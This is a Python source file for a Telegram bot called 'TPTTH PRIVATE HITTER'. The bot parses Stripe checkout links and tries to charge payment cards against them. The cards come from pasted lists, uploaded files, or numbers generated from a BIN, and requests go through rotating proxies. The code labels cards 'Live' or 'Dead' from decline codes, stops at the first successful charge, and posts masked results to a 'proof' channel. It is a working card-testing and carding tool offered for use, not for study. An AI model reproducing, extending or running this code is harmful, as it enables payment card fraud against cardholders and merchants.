# -*- coding: utf-8 -*-
"""Stripe checkout parse + charge with proxy + BIN gen.
/co url               – Parse checkout
/co url cc|mm|yy|cvv  – Charge 1 card
/co url bin BIN [n]   – Gen cards from BIN and hit
Proxy from /addproxy is auto-used.
"""
import time
from aiogram import Router
from aiogram.types import Message
from aiogram.filters import Command
from aiogram.enums import ParseMode

from card_utils import parse_cards
from bin_gen import generate_cards_from_bin
from hitter.checkout_parse import extract_checkout_url, get_checkout_info
from hitter.stripe_charge import charge_card
from proxy_manager import get_random_proxy_url
from config import PROOF_CHANNEL

router = Router()

def _sym(c: str) -> str:
    return {"USD": "$", "EUR": "€", "GBP": "£", "INR": "₹", "JPY": "¥"}.get(c, "")

def _mask_cc(card_str: str) -> str:
    parts = card_str.split("|")
    if not parts:
        return "XXXX"
    cc = parts[0]
    if len(cc) >= 8:
        masked = cc[:6] + "X" * (len(cc) - 10) + cc[-4:] if len(cc) > 10 else cc[:4] + "XXXX" + cc[-4:]
    else:
        masked = "XXXX"
    parts[0] = masked
    return "|".join(parts)

def _user_tag(user) -> str:
    if user.username:
        return f"@{user.username}"
    name = user.first_name or ""
    if user.last_name:
        name += f" {user.last_name}"
    return f'<a href="tg://user?id={user.id}">{name}</a>'

LIVE_CODES = frozenset({
    "incorrect_cvc", "incorrect_zip", "insufficient_funds",
    "authentication_required", "card_velocity_exceeded",
})

DEAD_CODES = frozenset({
    "stolen_card", "lost_card", "fraudulent", "pickup_card",
    "restricted_card", "security_violation", "card_not_supported",
    "invalid_account", "do_not_honor", "do_not_try_again",
    "invalid_amount", "currency_not_supported", "testmode_decline",
    "expired_card", "processing_error", "new_account_information_available",
    "disputed", "invalid_customer_account", "limit_exceeded",
    "partner_invalid", "partner_high_risk",
})


def _status_line(r: dict) -> str:
    st = (r.get("status") or "").upper()
    msg = (r.get("response") or "").strip().lower()
    resp_raw = (r.get("response") or "").strip()

    if st == "CHARGED":
        return "Live ✅ (charged)"

    if st == "CCN":
        code = resp_raw.split(":", 1)[0].strip().lower() if ":" in resp_raw else "ccn"
        return f"Live ✅ ({code})"

    if st == "DECLINED":
        code = ""
        if resp_raw and ":" in resp_raw:
            code = resp_raw.split(":", 1)[0].strip().lower().replace(" ", "_")[:30]

        if code in LIVE_CODES or "incorrect_cvc" in msg or "security code" in msg:
            return f"Live ✅ ({code or 'incorrect_cvc'})"
        if "insufficient_funds" in msg:
            return "Live ✅ (insufficient_funds)"
        if "integration surface" in msg or "unsupported" in msg:
            return "Dead (unsupported_integration) ❌"
        if code in DEAD_CODES:
            return f"Dead ({code}) ❌"

        return f"Dead ({code}) ❌" if code else "Dead ❌"

    if st == "3DS":
        return "Live ✅ (3DS)"

    if st in ("ERROR", "FAILED"):
        return "Dead ❌"

    if "no longer active" in msg or ("session" in msg and "active" in msg):
        return "Stopped ❌"

    return "Dead ❌"

def _build_live_report(
    checkout: dict, results: list, total_cards: int,
    price_str: str, finished: bool = False,
) -> str:
    site_name = checkout.get("merchant") or "N/A"
    site_line = site_name
    lines = [
        "TPTTH PRIVATE HITTER",
        "—  —  —  —  —",
        f"Sɪᴛᴇ: {site_line}",
        f"Aᴍᴏᴜɴᴛ: {price_str}",
        f"Cᴀʀᴅs: {len(results)}/{total_cards}",
        "━━━━━━━━━━━━━━━━━━━━━━━━━━",
    ]
    for i, r in enumerate(results, 1):
        lines.append(f"Card #{i}:")
        lines.append(r["card"])
        lines.append(f"Sᴛᴀᴛᴜs: {_status_line(r)}")
        lines.append(f"Message: {r.get('response') or 'N/A'}")
        lines.append(f"Tɪᴍᴇ: {r.get('time', 0)}s")
        lines.append("━━━━━━━━━━━━━━━━━━━━━━━━━━")
    if not finished:
        lines.append(f"⏳ Đang check card #{len(results) + 1}...")
    else:
        lines.append("Aʟʟ ᴄᴀʀᴅs ᴘʀᴏᴄᴇssᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ")
    lines.append("Bʏ: @idkbroo_fr")
    return "\n".join(lines)

@router.message(Command("co"))
async def cmd_co(msg: Message):
    text = (msg.text or "").strip()
    parts = text.split(maxsplit=3)
    uid = msg.from_user.id

    if len(parts) < 2:
        await msg.answer(
            "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "  <b>TPTTH PRIVATE HITTER</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🔹 <code>/co &lt;url&gt;</code> — Parse checkout\n"
            "🔹 <code>/co &lt;url&gt; cc|mm|yy|cvv</code> — Hit 1 thẻ\n"
            "🔹 <code>/co &lt;url&gt; bin &lt;BIN&gt; [n]</code> — Gen & hit\n\n"
            "Proxy auto từ <code>/addproxy</code>\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "  <b>by @idkbroo_fr</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━",
            parse_mode=ParseMode.HTML,
        )
        return

    url = extract_checkout_url(parts[1]) or parts[1].strip()
    cards = []
    bin_mode = False

    if len(parts) >= 3:
        if parts[2].lower() == "bin" and len(parts) >= 4:
            bin_mode = True
            sp = parts[3].strip().split()
            bin_value = sp[0]
            bin_count = min(int(sp[1]), 50) if len(sp) >= 2 and sp[1].isdigit() else 1
            cards = [
                {"cc": c["cc"], "mm": c["mm"], "yy": c["yy"], "cvv": c["cvv"]}
                for c in generate_cards_from_bin(bin_value, bin_count)
            ]
        else:
            rest = " ".join(parts[2:])
            if msg.reply_to_message and getattr(msg.reply_to_message, "document", None):
                doc = msg.reply_to_message.document
                if doc.file_name and doc.file_name.endswith(".txt"):
                    try:
                        f = await msg.bot.get_file(doc.file_id)
                        data = await msg.bot.download_file(f.file_path)
                        rest = data.read().decode("utf-8", errors="replace")
                    except Exception:
                        pass
            cards = parse_cards(rest)

    proxy_url = get_random_proxy_url(uid)
    proxy_label = "Proxy: ON" if proxy_url else "No proxy"

    status_msg = await msg.answer(f"⏳ Đang parse checkout...\n🔌 {proxy_label}")
    checkout = await get_checkout_info(url, proxy_url=proxy_url)

    if checkout.get("error"):
        await status_msg.edit_text(
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"❌ <b>Error</b>\n{checkout['error']}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━",
            parse_mode=ParseMode.HTML,
        )
        return

    price = checkout.get("price") or 0
    currency = checkout.get("currency") or "USD"
    price_str = f"{_sym(currency)}{price:.2f} {currency}"

    if not cards:
        info_lines = [
            "━━━━━━━━━━━━━━━━━━━━━━━━━━",
            "  <b>TPTTH PRIVATE HITTER</b>",
            "━━━━━━━━━━━━━━━━━━━━━━━━━━",
            "",
            f"✅ <b>Checkout Parsed</b> — {price_str}",
            "",
            f"🏪 Merchant: {checkout.get('merchant') or 'N/A'}",
            f"📦 Product: {checkout.get('product') or 'N/A'}",
            f"🌍 Country: {checkout.get('country') or 'N/A'}",
            f"📋 Mode: {checkout.get('mode') or 'N/A'}",
        ]
        if checkout.get("cards_accepted"):
            info_lines.append(f"💳 Cards: {checkout['cards_accepted']}")
        if checkout.get("customer_email"):
            info_lines.append(f"📧 Email: {checkout['customer_email']}")
        info_lines.append(f"🔑 PK: <code>{(checkout.get('pk') or '')[:24]}...</code>")
        info_lines.append(f"🎫 CS: <code>{checkout.get('cs') or ''}</code>")
        info_lines.append(f"🔌 {proxy_label}")
        info_lines.append("")
        info_lines.append("━━━━━━━━━━━━━━━━━━━━━━━━━━")
        info_lines.append("  <b>by @idkbroo_fr</b>")
        info_lines.append("━━━━━━━━━━━━━━━━━━━━━━━━━━")
        await status_msg.edit_text("\n".join(info_lines), parse_mode=ParseMode.HTML)
        return

    mode_str = "BIN Gen" if bin_mode else "CC List"
    await status_msg.edit_text(
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔄 Hitting {price_str} — {len(cards)} cards ({mode_str})\n"
        f"🔌 {proxy_label}\n"
        f"⏳ Đang check card #1...\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━"
    )

    start = time.perf_counter()
    results = []
    charged_one = None
    last_text = ""

    for i, card in enumerate(cards):
        r = await charge_card(card, checkout, proxy_url=proxy_url)
        results.append(r)

        is_last = (i == len(cards) - 1) or r["status"] == "CHARGED"
        live_text = _build_live_report(
            checkout, results, len(cards), price_str, finished=is_last,
        )
        if live_text != last_text:
            try:
                await status_msg.edit_text(live_text)
                last_text = live_text
            except Exception:
                pass

        if r["status"] == "CHARGED":
            charged_one = r
            user_tag = _user_tag(msg.from_user)

            await msg.answer(
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"  🟢 <b>CHARGED SUCCESSFULLY</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"💳 <code>{r['card']}</code>\n"
                f"💰 {price_str}\n"
                f"🏪 {checkout.get('merchant') or 'N/A'}\n"
                f"⏱ {r['time']}s\n"
                f"👤 Process by: {user_tag}\n\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"  <b>by @idkbroo_fr</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━",
                parse_mode=ParseMode.HTML,
            )

            if PROOF_CHANNEL:
                try:
                    await msg.bot.send_message(
                        PROOF_CHANNEL,
                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"  🟢 <b>CHARGED SUCCESSFULLY</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"💳 <code>{_mask_cc(r['card'])}</code>\n"
                        f"💰 {price_str}\n"
                        f"🏪 {checkout.get('merchant') or 'N/A'}\n"
                        f"⏱ {r['time']}s\n"
                        f"👤 Process by: {user_tag}\n\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"  <b>by @idkbroo_fr</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━",
                        parse_mode=ParseMode.HTML,
                    )
                except Exception:
                    pass

            break

    total_time = round(time.perf_counter() - start, 2)
    charged_n = sum(1 for x in results if x["status"] == "CHARGED")
    ccn_n = sum(1 for x in results if x["status"] == "CCN")
    declined_n = sum(1 for x in results if x["status"] == "DECLINED")
    three_ds = sum(1 for x in results if x["status"] == "3DS")
    errors = sum(1 for x in results if x["status"] in ("ERROR", "FAILED"))

    final = _build_live_report(checkout, results, len(cards), price_str, finished=True)
    summary = f"\n\n📊 ✅ {charged_n}"
    if ccn_n:
        summary += f"  🟡 CCN:{ccn_n}"
    summary += f"  ❌ {declined_n}  🔐 {three_ds}"
    if errors:
        summary += f"  ⚠️ {errors}"
    summary += f"\n⏱ {total_time}s  🔌 {proxy_label}"
    final += summary

    if final != last_text:
        try:
            await status_msg.edit_text(final, parse_mode=ParseMode.HTML)
        except Exception:
            pass
